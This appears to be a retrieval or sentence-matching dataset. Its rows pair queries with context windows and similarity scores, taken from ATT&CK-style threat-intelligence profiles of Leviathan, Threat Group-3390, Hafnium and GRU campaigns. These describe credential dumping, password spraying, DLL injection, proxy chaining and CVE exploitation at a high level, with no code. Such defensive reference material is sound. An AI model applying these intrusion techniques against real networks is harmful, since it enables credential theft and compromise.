"adversaries may obtain and abuse credentials of a local account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",the adversary is known for harvesting login credentials  [t1589.001]. [17]idnamedescriptiont1589.001gather victim identity information: credentialsadversaries may gather credentials that can be used during targeting.initial access[ta0001]initial access consists of techniques that use various entry vectors to gain their initial foothold within a network.,"for example, the adversary may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078].",[18] these specific actors obtained and abused credentials of domain [t1078.002] and cloud accounts [t1078.004]. [19] the actors also used external remote services to gain access to systems [t1133].,66f576363063d294857008c7,700,0.7937408354553095
"adversaries may obtain and abuse credentials of a local account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","the adversary obtains and abuses credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078]. [24]  specifically in this case, credentials of cloud accounts [t1078.004] were obtained and abused.","[25]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.defense evasion[ta0005]defense evasion consists of techniques that adversaries use to avoid detection throughout their compromise.","the adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [t1027]. [26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords.",66f576363063d294857008c7,710,0.7209212014874076
"to disguise the source of malicious traffic, adversaries may chain together multiple proxies.","the adversary leverages information repositories, such as sharepoint, to mine valuable information [t1213.002]. [31]idnamedescriptiont1213.002data from information repositories: sharepointadversaries may leverage the sharepoint repository as a source to mine valuable information.command and control [ta0011]command and control (c2) consists of techniques that adversaries may use to communicate with systems under their control within a victim network.",the adversary chained together multiple proxies to disguise the source of malicious traffic.,"in this case, tor and vpn servers are used as multi-hop proxies to route c2 traffic and obfuscate their activities [t1090.003]. [32]idnamedescriptiont1090.003proxy: multi-hop proxyto disguise the source of malicious traffic, adversaries may chain together multiple proxies.additional resources[1] nsa, cisa, fbi, ncsc cybersecurity advisory:russian gru conducting global brute force campaign to compromise enterprise and cloud environments, 1 july 2021.",66f576363063d294857008c7,721,0.7438644318535379
leviathan has used multi-hop proxies to disguise the source of their malicious traffic.,[2][1]enterpriset1055.001process injection:dynamic-link library injectionleviathanhas utilized techniques like reflective dll loading to write a dll into memory and load a shell that provides backdoor access to the victim. [4]enterpriset1572protocol tunnelingleviathanhas used protocol tunneling to further conceal c2 communications and infrastructure.,[1]enterpriset1090.003proxy:multi-hop proxyleviathanhas used multi-hop proxies to disguise the source of their malicious traffic.,[1]enterpriset1021.001remote services:remote desktop protocolleviathanhas targeted rdp credentials and used it to move through the victim environment. [8].004remote services:sshleviathanused ssh for internal reconnaissance.,66f5764a3063d294857008d9,1412,0.7271036538642812
"adversaries may attempt to access or create a copy of the active directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.","the adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [t1027]. [26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords.","the adversary attempted to access or create a copy of the active directory (ad) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [t1003.003].","[27] the adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [t1110.003]. [28]idnamedescriptiont1003.003os credential dumping: ntdsadversaries may attempt to access or create a copy of the active directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.t1110.003brute force: password sprayingadversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.discovery consists of techniques an adversary may use to gain knowledge about the system and internal network.",66f576363063d294857008c7,713,0.829687448193091
"adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.","[24]  specifically in this case, credentials of cloud accounts [t1078.004] were obtained and abused. [25]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.defense evasion[ta0005]defense evasion consists of techniques that adversaries use to avoid detection throughout their compromise.","the adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [t1027].","[26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords. the adversary attempted to access or create a copy of the active directory (ad) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [t1003.003].",66f576363063d294857008c7,711,0.786516263786918
"adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.","[25]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.defense evasion[ta0005]defense evasion consists of techniques that adversaries use to avoid detection throughout their compromise. the adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [t1027].","[26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords.","the adversary attempted to access or create a copy of the active directory (ad) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [t1003.003]. [27] the adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [t1110.003].",66f576363063d294857008c7,712,0.7138790189287381
adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.,"[26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords. the adversary attempted to access or create a copy of the active directory (ad) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [t1003.003].",[27] the adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [t1110.003].,"[28]idnamedescriptiont1003.003os credential dumping: ntdsadversaries may attempt to access or create a copy of the active directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.t1110.003brute force: password sprayingadversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. the adversary enumerated files and directories or searched in specific locations of a host or network share for certain information within a file system [t1083].",66f576363063d294857008c7,714,0.7905181731563774
adversaries may chain together multiple proxies to further disguise the source of malicious traffic.,"the adversary leverages information repositories, such as sharepoint, to mine valuable information [t1213.002]. [31]idnamedescriptiont1213.002data from information repositories: sharepointadversaries may leverage the sharepoint repository as a source to mine valuable information.command and control [ta0011]command and control (c2) consists of techniques that adversaries may use to communicate with systems under their control within a victim network.",the adversary chained together multiple proxies to disguise the source of malicious traffic.,"in this case, tor and vpn servers are used as multi-hop proxies to route c2 traffic and obfuscate their activities [t1090.003]. [32]idnamedescriptiont1090.003proxy: multi-hop proxyto disguise the source of malicious traffic, adversaries may chain together multiple proxies.additional resources[1] nsa, cisa, fbi, ncsc cybersecurity advisory:russian gru conducting global brute force campaign to compromise enterprise and cloud environments, 1 july 2021.",66f576363063d294857008c7,721,0.7071217543951408
leviathan has compromised social media accounts to conduct social engineering attacks.,[2][3]enterpriset1059.001command and scripting interpreter:powershellleviathanhas used powershell for execution. [2][3][1][4].005command and scripting interpreter:visual basicleviathanhas used vbscript.,[2]enterpriset1586.001compromise accounts:social media accountsleviathanhas compromised social media accounts to conduct social engineering attacks.,[1].002compromise accounts:email accountsleviathanhas compromised email accounts to conduct social engineering attacks. [1]enterpriset1074.001data staged:local data stagingleviathanhas used c:\\\\windows\\\\debug and c:\\\\perflogs as staging directories.,66f5764a3063d294857008d9,1386,0.7580465653114624
"leviathan has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.","[8].001lsass memoryleviathanhas used publicly available tools to dump password hashes, including procdump and wce. [8]enterpriset1566.001phishing:spearphishing attachmentleviathanhas sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.","[2][1].002phishing:spearphishing linkleviathanhas sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.",[2][1]enterpriset1055.001process injection:dynamic-link library injectionleviathanhas utilized techniques like reflective dll loading to write a dll into memory and load a shell that provides backdoor access to the victim. [4]enterpriset1572protocol tunnelingleviathanhas used protocol tunneling to further conceal c2 communications and infrastructure.,66f5764a3063d294857008d9,1409,0.7993233554729074
leviathan has used steganography to hide stolen data inside other files stored on github.,"[4]enterpriset1534internal spearphishingleviathanhas conducted internal spearphishing within the victim's environment for lateral movement. [1]enterpriset1027.001obfuscated files or information:binary paddingleviathanhas inserted garbage characters into code, presumably to avoid anti-virus detection.",[2].003obfuscated files or information:steganographyleviathanhas used steganography to hide stolen data inside other files stored on github.,"[1].013obfuscated files or information:encrypted/encoded fileleviathanhas obfuscated code using base64 and gzip compression. [2]enterpriset1003os credential dumpingleviathanhas used publicly available tools to dump password hashes, includinghomefry.",66f5764a3063d294857008d9,1404,0.7019849869397526
"adversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",the adversary is known for harvesting login credentials  [t1589.001]. [17]idnamedescriptiont1589.001gather victim identity information: credentialsadversaries may gather credentials that can be used during targeting.initial access[ta0001]initial access consists of techniques that use various entry vectors to gain their initial foothold within a network.,"for example, the adversary may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078].",[18] these specific actors obtained and abused credentials of domain [t1078.002] and cloud accounts [t1078.004]. [19] the actors also used external remote services to gain access to systems [t1133].,66f576363063d294857008c7,700,0.8844925689732613
"adversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","[21] finally, they sent spearphishing emails with a malicious link in an attempt to gain access [t1566.002]. [22]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.002valid accounts: domain accountsadversaries may obtain and abuse credentials of a domain account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.t1133external remote servicesadversaries may leverage external-facing remote services to initially access and/or persist within a network.t1190exploit public-facing applicationadversaries may attempt to take advantage of a weakness in an internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior.t1566.002phishing: spearphishing linkadversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems.persistence[ta0003]persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.","the adversary obtains and abuses credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078].","[23]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.privilege escalation[ta0004]privilege escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. the adversary obtains and abuses credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078].",66f576363063d294857008c7,706,0.7532785842259357
"adversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","[22]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.002valid accounts: domain accountsadversaries may obtain and abuse credentials of a domain account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.t1133external remote servicesadversaries may leverage external-facing remote services to initially access and/or persist within a network.t1190exploit public-facing applicationadversaries may attempt to take advantage of a weakness in an internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior.t1566.002phishing: spearphishing linkadversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems.persistence[ta0003]persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. the adversary obtains and abuses credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078].","[23]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.privilege escalation[ta0004]privilege escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network.","the adversary obtains and abuses credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078]. [24]  specifically in this case, credentials of cloud accounts [t1078.004] were obtained and abused.",66f576363063d294857008c7,707,0.7214403291556498
"adversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","the adversary obtains and abuses credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078]. [23]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.privilege escalation[ta0004]privilege escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network.","the adversary obtains and abuses credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078].","[24]  specifically in this case, credentials of cloud accounts [t1078.004] were obtained and abused. [25]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.defense evasion[ta0005]defense evasion consists of techniques that adversaries use to avoid detection throughout their compromise.",66f576363063d294857008c7,708,0.7532785842259357
"adversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","the adversary obtains and abuses credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078]. [24]  specifically in this case, credentials of cloud accounts [t1078.004] were obtained and abused.","[25]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.defense evasion[ta0005]defense evasion consists of techniques that adversaries use to avoid detection throughout their compromise.","the adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [t1027]. [26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords.",66f576363063d294857008c7,710,0.7560966220643559
leviathan has utilized techniques like reflective dll loading to write a dll into memory and load a shell that provides backdoor access to the victim.,"[8]enterpriset1566.001phishing:spearphishing attachmentleviathanhas sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files. [2][1].002phishing:spearphishing linkleviathanhas sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.",[2][1]enterpriset1055.001process injection:dynamic-link library injectionleviathanhas utilized techniques like reflective dll loading to write a dll into memory and load a shell that provides backdoor access to the victim.,[4]enterpriset1572protocol tunnelingleviathanhas used protocol tunneling to further conceal c2 communications and infrastructure. [1]enterpriset1090.003proxy:multi-hop proxyleviathanhas used multi-hop proxies to disguise the source of their malicious traffic.,66f5764a3063d294857008d9,1410,0.7102689099012994
"cobalt group had exploited multiple vulnerabilities for execution, including microsoft’s equation editor , an internet explorer vulnerability , cve-2017-8570, cve-2017-0199, and cve-2017-8759.",[3]enterpriset1041exfiltration over c2 channelleviathanhas exfiltrated data over its c2 channel. [1]enterpriset1567.002exfiltration over web service:exfiltration to cloud storageleviathanhas used an uploader known as lunchmoney that can exfiltrate files to dropbox.,"[2][3]enterpriset1203exploitation for client executionleviathanhas exploited multiple microsoft office and .net vulnerabilities for execution, including cve-2017-0199, cve-2017-8759, and cve-2017-11882.",[2][3][1][4]enterpriset1133external remote servicesleviathanhas used external remote services such as virtual private networks (vpn) to gain initial access. [1]enterpriset1589.001gather victim identity information:credentialsleviathanhas collected compromised credentials to use for targeting efforts.,66f5764a3063d294857008d9,1397,0.72591539801782
"adversaries may obtain and abuse credentials of a local account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",the adversary is known for harvesting login credentials  [t1589.001]. [17]idnamedescriptiont1589.001gather victim identity information: credentialsadversaries may gather credentials that can be used during targeting.initial access[ta0001]initial access consists of techniques that use various entry vectors to gain their initial foothold within a network.,"for example, the adversary may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078].",[18] these specific actors obtained and abused credentials of domain [t1078.002] and cloud accounts [t1078.004]. [19] the actors also used external remote services to gain access to systems [t1133].,66f576363063d294857008c7,700,0.7937408354553095
"adversaries may obtain and abuse credentials of a local account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","the adversary obtains and abuses credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078]. [24]  specifically in this case, credentials of cloud accounts [t1078.004] were obtained and abused.","[25]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.defense evasion[ta0005]defense evasion consists of techniques that adversaries use to avoid detection throughout their compromise.","the adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [t1027]. [26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords.",66f576363063d294857008c7,710,0.7209212014874076
"to disguise the source of malicious traffic, adversaries may chain together multiple proxies.","the adversary leverages information repositories, such as sharepoint, to mine valuable information [t1213.002]. [31]idnamedescriptiont1213.002data from information repositories: sharepointadversaries may leverage the sharepoint repository as a source to mine valuable information.command and control [ta0011]command and control (c2) consists of techniques that adversaries may use to communicate with systems under their control within a victim network.",the adversary chained together multiple proxies to disguise the source of malicious traffic.,"in this case, tor and vpn servers are used as multi-hop proxies to route c2 traffic and obfuscate their activities [t1090.003]. [32]idnamedescriptiont1090.003proxy: multi-hop proxyto disguise the source of malicious traffic, adversaries may chain together multiple proxies.additional resources[1] nsa, cisa, fbi, ncsc cybersecurity advisory:russian gru conducting global brute force campaign to compromise enterprise and cloud environments, 1 july 2021.",66f576363063d294857008c7,721,0.7438644318535379
"adversaries may attempt to access or create a copy of the active directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.","the adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [t1027]. [26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords.","the adversary attempted to access or create a copy of the active directory (ad) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [t1003.003].","[27] the adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [t1110.003]. [28]idnamedescriptiont1003.003os credential dumping: ntdsadversaries may attempt to access or create a copy of the active directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.t1110.003brute force: password sprayingadversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.discovery consists of techniques an adversary may use to gain knowledge about the system and internal network.",66f576363063d294857008c7,713,0.829687448193091
"adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.","[24]  specifically in this case, credentials of cloud accounts [t1078.004] were obtained and abused. [25]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.defense evasion[ta0005]defense evasion consists of techniques that adversaries use to avoid detection throughout their compromise.","the adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [t1027].","[26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords. the adversary attempted to access or create a copy of the active directory (ad) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [t1003.003].",66f576363063d294857008c7,711,0.786516263786918
"adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.","[25]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.defense evasion[ta0005]defense evasion consists of techniques that adversaries use to avoid detection throughout their compromise. the adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [t1027].","[26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords.","the adversary attempted to access or create a copy of the active directory (ad) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [t1003.003]. [27] the adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [t1110.003].",66f576363063d294857008c7,712,0.7138790189287381
adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.,"[26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords. the adversary attempted to access or create a copy of the active directory (ad) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [t1003.003].",[27] the adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [t1110.003].,"[28]idnamedescriptiont1003.003os credential dumping: ntdsadversaries may attempt to access or create a copy of the active directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.t1110.003brute force: password sprayingadversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. the adversary enumerated files and directories or searched in specific locations of a host or network share for certain information within a file system [t1083].",66f576363063d294857008c7,714,0.7905181731563774
"leviathan has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.","[8].001lsass memoryleviathanhas used publicly available tools to dump password hashes, including procdump and wce. [8]enterpriset1566.001phishing:spearphishing attachmentleviathanhas sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.","[2][1].002phishing:spearphishing linkleviathanhas sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.",[2][1]enterpriset1055.001process injection:dynamic-link library injectionleviathanhas utilized techniques like reflective dll loading to write a dll into memory and load a shell that provides backdoor access to the victim. [4]enterpriset1572protocol tunnelingleviathanhas used protocol tunneling to further conceal c2 communications and infrastructure.,66f5764a3063d294857008d9,1409,0.7993233554729074
"during execution, threat group-3390 malware deobfuscates and decompresses code that was encoded with metasploit’s shikata_ga_nai encoder as well as compressed with lznt1 compression.",[2].002data staged:remote data stagingthreat group-3390has moved staged encrypted archives to internet-facing servers that had previously been compromised withchina chopperprior to exfiltration. [2]enterpriset1030data transfer size limitsthreat group-3390actors have split rar files for exfiltration into parts.,"[1]enterpriset1140deobfuscate/decode files or informationduring execution,threat group-3390malware deobfuscates and decompresses code that was encoded with metasploit’s shikata_ga_nai encoder as well as compressed with lznt1 compression.",[3]enterpriset1189drive-by compromisethreat group-3390has extensively used strategic web compromises to target victims. [1][3]enterpriset1567.002exfiltration over web service:exfiltration to cloud storagethreat group-3390has exfiltrated stolen data to dropbox.,66f577f83063d294857009b2,2637,0.7868187504061275
threat group-3390 has embedded malicious code into websites to screen a potential victim's ip address and then exploit their browser if they are of interest.,"[9]enterpriset1608.001stage capabilities:upload malwarethreat group-3390has hosted malicious payloads on dropbox. [4].002stage capabilities:upload toolthreat group-3390has staged tools, includinggsecdumpand wce, on previously compromised websites.",[1].004stage capabilities:drive-by targetthreat group-3390has embedded malicious code into websites to screen a potential victim's ip address and then exploit their browser if they are of interest.,[8]enterpriset1195.002supply chain compromise:compromise software supply chainthreat group-3390has compromised the able desktop installer to gain access to victim's environments. [5]enterpriset1016system network configuration discoverythreat group-3390actors usenbtscanto discover vulnerable systems.,66f577f83063d294857009b2,2674,0.7193478185313562
"hafnium has exploited cve-2021-26855, cve-2021-26857, cve-2021-26858, and cve-2021-27065  to compromise on-premises versions of microsoft exchange server, enabling access to email accounts and installation of additional malware.",[3]enterpriset1189drive-by compromisethreat group-3390has extensively used strategic web compromises to target victims. [1][3]enterpriset1567.002exfiltration over web service:exfiltration to cloud storagethreat group-3390has exfiltrated stolen data to dropbox.,"[4]enterpriset1190exploit public-facing applicationthreat group-3390has exploited the microsoft sharepoint vulnerability cve-2019-0604 and cve-2021-26855, cve-2021-26857, cve-2021-26858, and cve-2021-27065 in exchange server.",[5]enterpriset1203exploitation for client executionthreat group-3390has exploited cve-2018-0798 in equation editor. [5]enterpriset1068exploitation for privilege escalationthreat group-3390has used cve-2014-6324 and cve-2017-0213 to escalate privileges.,66f577f83063d294857009b2,2640,0.7815703880647559
threat group-3390 actors look for and use vpn profiles during an operation to access the network using external vpn services.,[5]enterpriset1068exploitation for privilege escalationthreat group-3390has used cve-2014-6324 and cve-2017-0213 to escalate privileges. [2][11]enterpriset1210exploitation of remote servicesthreat group-3390has exploited ms17-010 to move laterally to other systems on the network.,[9]enterpriset1133external remote servicesthreat group-3390actors look for and use vpn profiles during an operation to access the network using external vpn services.,[1]threat group-3390has also obtained owa account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network. [2]enterpriset1574.001hijack execution flow:dll search order hijackingthreat group-3390has performed dll search order hijacking to execute their payload.,66f577f83063d294857009b2,2644,0.7370365449850876
threat group-3390 has also obtained owa account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.,[2][11]enterpriset1210exploitation of remote servicesthreat group-3390has exploited ms17-010 to move laterally to other systems on the network. [9]enterpriset1133external remote servicesthreat group-3390actors look for and use vpn profiles during an operation to access the network using external vpn services.,[1]threat group-3390has also obtained owa account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.,"[2]enterpriset1574.001hijack execution flow:dll search order hijackingthreat group-3390has performed dll search order hijacking to execute their payload. [6].002hijack execution flow:dll side-loadingthreat group-3390has used dll side-loading, including by using legitimate kaspersky antivirus variants as well asrc.exe, a legitimate microsoft resource compiler.",66f577f83063d294857009b2,2645,0.9259598023585986
slothfulmedia can enumerate files and directories.,"enumerate processes by id, name, or privileges.7. start and stop processes.8.",enumerate files and directories.9.,open a named pipe and send and receive data.10. take screenshots.11.,66f577743063d29485700983,1676,0.7440846592598209
they have also dumped credentials from domain controllers.,"[9][1].003obtain capabilities:code signing certificatesthreat group-3390has obtained stolen valid certificates, including from vmprotect and the chinese instant messaging application youdu, for their operations. [10]enterpriset1003.001os credential dumping:lsass memorythreat group-3390actors have used a modified version ofmimikatzcalled wrapikatz to dump credentials.",they have also dumped credentials from domain controllers.,[1][2].002os credential dumping:security account managerthreat group-3390actors have usedgsecdumpto dump credentials. they have also dumped credentials from domain controllers.,66f577f83063d294857009b2,2660,1.0
they have also dumped credentials from domain controllers.,they have also dumped credentials from domain controllers. [1][2].002os credential dumping:security account managerthreat group-3390actors have usedgsecdumpto dump credentials.,they have also dumped credentials from domain controllers.,[1][2].004os credential dumping:lsa secretsthreat group-3390actors have usedgsecdumpto dump credentials. they have also dumped credentials from domain controllers.,66f577f83063d294857009b2,2662,1.0
they have also dumped credentials from domain controllers.,they have also dumped credentials from domain controllers. [1][2].004os credential dumping:lsa secretsthreat group-3390actors have usedgsecdumpto dump credentials.,they have also dumped credentials from domain controllers.,[1][2]enterpriset1566.001phishing:spearphishing attachmentthreat group-3390has used e-mail to deliver malicious attachments to victims. [4]enterpriset1055.012process injection:process hollowingathreat group-3390tool can spawnsvchost.exeand inject the payload into that process.,66f577f83063d294857009b2,2664,1.0
"during execution, threat group-3390 malware deobfuscates and decompresses code that was encoded with metasploit’s shikata_ga_nai encoder as well as compressed with lznt1 compression.",[2].002data staged:remote data stagingthreat group-3390has moved staged encrypted archives to internet-facing servers that had previously been compromised withchina chopperprior to exfiltration. [2]enterpriset1030data transfer size limitsthreat group-3390actors have split rar files for exfiltration into parts.,"[1]enterpriset1140deobfuscate/decode files or informationduring execution,threat group-3390malware deobfuscates and decompresses code that was encoded with metasploit’s shikata_ga_nai encoder as well as compressed with lznt1 compression.",[3]enterpriset1189drive-by compromisethreat group-3390has extensively used strategic web compromises to target victims. [1][3]enterpriset1567.002exfiltration over web service:exfiltration to cloud storagethreat group-3390has exfiltrated stolen data to dropbox.,66f577f83063d294857009b2,2637,0.7868187504061275
